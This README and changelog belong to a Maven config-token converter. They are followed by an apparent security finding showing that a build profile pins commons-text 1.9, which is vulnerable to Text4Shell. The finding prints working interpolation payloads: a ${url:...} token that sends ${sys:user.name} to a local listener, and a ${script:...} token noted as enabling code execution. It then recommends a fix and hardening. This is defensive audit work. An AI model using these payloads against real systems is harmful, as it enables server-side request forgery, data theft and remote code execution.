=== README ===
# config-tools

A small Maven project. The parent POM defines the platform's managed dependency
baseline; the `config-converter` module resolves `${...}` interpolation tokens in
tenant config files using Commons Text.

## Layout

- `pom.xml` — parent POM: modules + platform-managed dependency baseline
- `converter/` — the `config-converter` module
  - `src/main/java/com/example/config/ConfigConverter.java` — token resolution
  - `src/test/java/com/example/config/ConfigConverterTest.java` — smoke test
  - `config/tenant.properties` — sample tenant config
- `CHANGELOG.md` — release history

## Build

```
mvn clean install
```

Builds the reactor with the internal `offline` build profile, runs the converter
smoke test (resolves `converter/config/tenant.properties` into
`converter/target/resolved.properties`), and packages
`converter/target/config-converter-1.0.0.jar`.
=== CHANGELOG ===
# Changelog

All notable changes to config-tools are recorded here.

## [Unreleased]

### Changed
- Standardized `commons-text` to **1.10.0** in the platform-managed dependency
  baseline (parent `pom.xml`). 1.10.0 changes the set of lookups the default
  `StringSubstitutor` interpolator enables (the interpolation-path change tracked
  as CVE-2022-42889 / "Text4Shell"); modules that interpolate tenant-supplied
  config values should resolve against the managed baseline.

## [1.0.0] - 2022-02-10

### Added
- Initial config-tools: platform dependency baseline (parent) and the
  `config-converter` module (resolves `${...}` tokens in tenant config).

## ⚠️ This resolved version is the vulnerable one — CVE-2022-42889 ("Text4Shell")

`ConfigConverter.convert()` passes **tenant-supplied** values through `StringSubstitutor.createInterpolator()`. In commons-text **1.9** the default interpolator registers the `script:`, `dns:` and `url:` lookups; 1.10.0 removed them. I verified this against the actual resolved jar, not just from advisories — probe of active lookups:

| Token | 1.9 (resolved) | 1.10.0 (baseline) |
|---|---|---|
| `${url:UTF-8:http://127.0.0.1:18080/…}` | **ACTIVE** → fetched remote body | off |
| `${dns:address\|localhost}` | **ACTIVE** → `127.0.0.1` | off |
| `${script:javascript:…}` | **registered/invoked** (errors here only because JDK 21 has no JS engine; RCE if Nashorn/GraalJS is on the classpath) | off |
| `${base64Decoder:…}` | ACTIVE | **ACTIVE** |

End-to-end through the project's own converter (temp files, project untouched) with a local listener on 127.0.0.1:18080 and a tenant file containing `internal.report=${url:UTF-8:http://127.0.0.1:18080/ssrf-from-tenant-config?leak=${sys:user.name}}`:

- **1.9:** converter made the outbound request and wrote the server's response into the config — listener logged `HIT: /ssrf-from-tenant-config?leak=${sys:user.name`. → SSRF / arbitrary URL fetch / blind DNS exfil from tenant-controlled config.
- **1.10.0:** token left inert.

## The downgrade buys nothing

- The internal mirror serves commons-text **1.10.0** (`HTTP 200`, alongside 1.9); it downloads and caches fine offline.
- `mvn -P '!offline' clean install` → **BUILD SUCCESS**, test passes, resolving **commons-text 1.10.0 + commons-lang3 3.12.0**. `base64Decoder:` still works in 1.10.0, so the existing tenant config and assertions are unaffected.

So the `offline` profile's override contradicts both the parent POM's managed baseline and the `[Unreleased]` CHANGELOG entry that explicitly calls out 1.10.0 for the CVE. **Recommended fix:** delete the `<dependencyManagement>` override from `converter/pom.xml`'s `offline` profile (let it inherit 1.10.0).

Residual hardening worth noting: even on 1.10.0 the default interpolator still resolves `${file:…}`, `${env:…}`, `${sys:…}`, `${const:…}`, `${localhost:…}` — i.e. tenant-controlled local file read/env disclosure. For untrusted input the safe pattern is an explicit interpolator with only what's needed, e.g. `new StringSubstitutor(StringLookupFactory.INSTANCE.interpolatorStringLookup(Map.of("base64Decoder", StringLookupFactory.INSTANCE.base64DecoderStringLookup()), null, false))`.
